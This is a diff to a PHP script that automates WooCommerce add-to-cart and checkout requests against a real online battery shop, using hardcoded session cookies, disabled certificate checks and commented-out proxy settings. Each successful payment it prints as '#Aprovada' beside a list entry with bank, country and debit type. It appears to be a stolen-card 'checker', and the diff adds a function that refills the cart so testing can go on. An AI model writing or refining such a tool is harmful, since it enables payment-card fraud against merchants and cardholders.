@@ -146,6 +146,49 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 20)), 0, 10);
 
 
 
+function updatecart(){
+
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.batteryyard.com.au/product/12sb0-8p/');
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
+'content-type: multipart/form-data; boundary=----WebKitFormBoundarySH9aOqaBYaYnABvK',
+'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; wplc_chat_status=5; _icl_current_language=en; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; nc_status=browsing; tcx_customerID=SJ0PrQLuCL; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=ee44954c74859f21239431caa72201bf%7C%7C1593669193%7C%7C1593665593%7C%7Cd4dd71bc5aad05b284bdae3c7f8fed70; wplc_cid=SJXRCIsK0I_1593583318130',
+'origin: https://www.batteryyard.com.au',
+'referer: https://www.batteryyard.com.au/product/12sb0-8p/',
+'user-agent: '.$browser.''
+));
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarySH9aOqaBYaYnABvK
+Content-Disposition: form-data; name="quantity"
+
+1
+------WebKitFormBoundarySH9aOqaBYaYnABvK
+Content-Disposition: form-data; name="add-to-cart"
+
+22941
+------WebKitFormBoundarySH9aOqaBYaYnABvK--');
+
+
+$update = curl_exec($ch);
+}
+
 //============================================================================================================================================================
 
 
@@ -183,7 +226,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; wplc_chat_status=5; _icl_current_language=en; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; nc_status=browsing; tcx_customerID=SJ0PrQLuCL; wplc_cid=SkJlDrXLu08_1593496383315; woocommerce_items_in_cart=1; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=ee44954c74859f21239431caa72201bf%7C%7C1593669193%7C%7C1593665593%7C%7Cd4dd71bc5aad05b284bdae3c7f8fed70; woocommerce_cart_hash=b9c0cc9bba61665516d7343ea7a9d697',
+'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; wplc_chat_status=5; _icl_current_language=en; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; nc_status=browsing; tcx_customerID=SJ0PrQLuCL; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=ee44954c74859f21239431caa72201bf%7C%7C1593669193%7C%7C1593665593%7C%7Cd4dd71bc5aad05b284bdae3c7f8fed70; wplc_cid=SJXRCIsK0I_1593583318130; woocommerce_items_in_cart=1; woocommerce_cart_hash=b9c0cc9bba61665516d7343ea7a9d697',
 'origin: https://www.batteryyard.com.au',
 'referer: https://www.batteryyard.com.au/checkout/',
 'user-agent: '.$browser.'',
@@ -234,7 +277,7 @@ $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-e
 // // $type = trim(strip_tags(getstr($fim,'"type":"','"')));
 
 if(strpos($result,'"result":"success"')){
-// updatecart();
+updatecart();
       echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
     }
 
